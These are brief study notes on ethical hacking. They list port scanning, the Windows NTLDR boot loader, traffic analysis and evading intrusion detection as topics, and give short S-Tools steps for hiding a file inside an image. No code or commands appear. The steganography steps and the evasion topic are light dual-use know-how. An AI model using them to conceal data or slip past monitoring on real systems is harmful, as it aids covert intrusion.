# Notes

#### Ethical Hacking Techniques

* Scanning ports for vulnerabilities

* NTLDR is boot loader for windows
* Network Traffic Analysis: More traffic More content
* Evading Intrusion Detection and Prevention

#### Steganography Algorithm

* Concealing a file within another file
* S-Tools: Drag Image, Drag File to be hidden, give password, right-click and select reveal, right-click
